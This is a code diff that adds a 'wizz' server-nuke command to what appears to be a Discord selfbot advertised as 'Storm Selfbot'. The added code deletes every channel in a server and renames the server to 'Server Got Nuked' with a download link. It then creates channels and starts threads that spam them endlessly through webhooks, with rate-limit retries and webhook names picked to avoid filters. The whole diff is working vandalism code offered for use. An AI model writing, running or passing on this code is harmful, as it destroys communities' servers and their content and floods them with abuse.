@@ -129,6 +129,74 @@ ugc_task = None
 # Store the bot's start time
 start_time = time.time()
 
+def ssspam(webhook_url):
+    while spams:
+        data = {'content': message}
+        try:
+            response = requests.post(webhook_url, json=data)
+            if response.status_code == 204:
+                continue
+            elif response.status_code == 429:  # Rate limit error
+                retry_after = response.json().get('retry_after', 1) / 1000
+                print(f"Rate limited. Retrying in {retry_after} seconds.")
+                time.sleep(retry_after)
+            else:
+                print(f"Unexpected status code {response.status_code}: {response.text}")
+                delay = random.randint(30, 60)
+                time.sleep(delay)
+        except Exception as e:
+            print(f"Error in ssspam: {e}")
+            delay = random.randint(30, 60)
+            time.sleep(delay)
+
+@bot.command()
+async def wizz(ctx):
+    try:
+        # Delete existing channels and roles
+        for channel in list(ctx.guild.channels):
+            try:
+                await channel.delete()
+            except Exception as e:
+                print(f"Error deleting channel: {e}")
+
+        # Edit guild
+        try:
+            await ctx.guild.edit(
+                name='Server Got Nuked',
+                description='Nuked Using Storm Selfbot here you can download https://github.com/RifatArefinBD',
+                reason=reason,
+                icon=None,
+                banner=None
+            )
+        except Exception as e:
+            print(f"Error editing guild: {e}")
+
+        # Create 5 text channels
+        channels = []
+        for i in range(5):
+            try:
+                channel = await ctx.guild.create_text_channel(name='nuked by storm selfbot')
+                channels.append(channel)
+                await asyncio.sleep(1)  # Delay to prevent hitting rate limits
+            except Exception as e:
+                print(f"Error creating channel: {e}")
+
+        # Create webhooks and start spamming
+        global spams
+        spams = True
+
+        for channel in channels:
+            try:
+                webhook_name = 'https://github.com/RifatArefinBD'  # Use a name that does not contain "discord"
+                webhook = await channel.create_webhook(name=webhook_name)
+                threading.Thread(target=ssspam, args=(webhook.url,)).start()
+                await asyncio.sleep(1)  # Delay to prevent hitting rate limits
+            except Exception as e:
+                print(f"Webhook Error {e}")
+
+    except Exception as e:
+        print(f"Error in wizz command: {e}")
+
 @bot.command()
 async def spam(ctx, amount: int, *, message: str):
     for _ in range(amount):
